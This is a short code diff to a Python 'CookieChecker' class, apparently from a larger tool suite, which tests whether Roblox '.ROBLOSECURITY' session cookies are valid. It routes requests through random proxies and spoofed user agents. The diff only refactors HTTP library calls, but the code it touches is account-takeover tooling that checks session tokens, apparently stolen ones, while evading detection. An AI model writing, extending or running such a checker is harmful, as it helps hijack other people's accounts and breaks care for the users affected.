@@ -1,6 +1,6 @@
 import os
 import concurrent.futures
-import httpx
+import httpc
 import re
 from Tool import Tool
 from utils import Utils
@@ -64,13 +64,13 @@ class CookieChecker(Tool):
         """
         Checks if a cookie is working
         """
-        proxies = self.get_random_proxies() if use_proxy else None
+        proxies = self.get_random_proxy() if use_proxy else None
 
-        with httpx.Client(proxies=proxies) as client:
-            user_agent = self.get_random_user_agent()
+        with httpc.Session(proxies=proxies) as client:
+            user_agent = httpc.get_random_user_agent()
             req_url = "https://www.roblox.com/mobileapi/userinfo"
             req_cookies = { ".ROBLOSECURITY": cookie }
-            req_headers = self.get_roblox_headers(user_agent)
+            req_headers = httpc.get_roblox_headers(user_agent)
 
             response = client.get(req_url, headers=req_headers, cookies=req_cookies)
 
